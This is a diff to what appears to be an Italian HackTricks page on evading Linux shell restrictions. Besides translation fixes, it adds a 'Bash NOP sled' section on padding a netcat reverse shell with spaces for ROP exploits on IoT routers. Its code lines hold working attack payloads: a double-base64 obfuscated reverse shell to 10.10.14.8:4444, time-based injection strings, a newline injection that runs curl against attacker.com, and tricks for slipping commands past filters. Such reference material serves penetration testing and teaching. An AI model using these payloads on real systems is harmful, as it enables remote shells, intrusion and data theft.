@@ -10,7 +10,7 @@
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### Shell Rev corta
+### Short Rev shell
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -138,13 +138,13 @@ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### Esfiltrazione di dati DNS
+### DNS data exfiltration
 
-Potresti usare **burpcollab** o [**pingb**](http://pingb.in) per esempio.
+Puoi usare **burpcollab** o [**pingb**](http://pingb.in) per esempio.
 
 ### Builtins
 
-Nel caso in cui non puoi eseguire funzioni esterne e hai solo accesso a un **insieme limitato di builtins per ottenere RCE**, ci sono alcuni trucchi utili per farlo. Di solito **non sarai in grado di usare tutti** i **builtins**, quindi dovresti **conoscere tutte le tue opzioni** per cercare di bypassare la prigione. Idea da [**devploit**](https://twitter.com/devploit).\
+Nel caso in cui non puoi eseguire funzioni esterne e hai solo accesso a un **insieme limitato di builtins per ottenere RCE**, ci sono alcuni trucchi utili per farlo. Di solito **non sarai in grado di usare tutti** i **builtins**, quindi dovresti **conoscere tutte le tue opzioni** per cercare di bypassare la jail. Idea da [**devploit**](https://twitter.com/devploit).\
 Prima di tutto controlla tutti i [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Poi qui hai alcune **raccomandazioni**:
 ```bash
 # Get list of builtins
@@ -202,7 +202,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Bypassare potenziali regex
+### Bypass potenziali regex
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -308,11 +308,33 @@ bypass-fs-protections-read-only-no-exec-distroless/
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
-## Riferimenti e Altro
+## Bash NOP Sled Basato su Spazio ("Bashsledding")
+
+Quando una vulnerabilità ti consente di controllare parzialmente un argomento che alla fine raggiunge `system()` o un'altra shell, potresti non conoscere l'offset esatto in cui l'esecuzione inizia a leggere il tuo payload. I tradizionali NOP sled (ad es. `\x90`) **non** funzionano nella sintassi della shell, ma Bash ignorerà in modo innocuo gli spazi bianchi iniziali prima di eseguire un comando.
+
+Pertanto, puoi creare un *NOP sled per Bash* prefissando il tuo comando reale con una lunga sequenza di spazi o caratteri di tabulazione:
+```bash
+# Payload sprayed into an environment variable / NVRAM entry
+"                nc -e /bin/sh 10.0.0.1 4444"
+# 16× spaces ───┘ ↑ real command
+```
+Se una catena ROP (o qualsiasi primitiva di corruzione della memoria) posiziona il puntatore delle istruzioni in qualsiasi punto all'interno del blocco di spazio, il parser di Bash salta semplicemente gli spazi bianchi fino a raggiungere `nc`, eseguendo il tuo comando in modo affidabile.
+
+Casi d'uso pratici:
+
+1. **Blob di configurazione mappati in memoria** (ad es. NVRAM) che sono accessibili tra i processi.
+2. Situazioni in cui l'attaccante non può scrivere byte NULL per allineare il payload.
+3. Dispositivi embedded dove è disponibile solo BusyBox `ash`/`sh` – ignorano anche gli spazi iniziali.
+
+> 🛠️  Combina questo trucco con gadget ROP che chiamano `system()` per aumentare drasticamente l'affidabilità dell'exploit su router IoT con memoria limitata.
+
+## Riferimenti e altro
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju)
+
+- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../banners/hacktricks-training.md}}
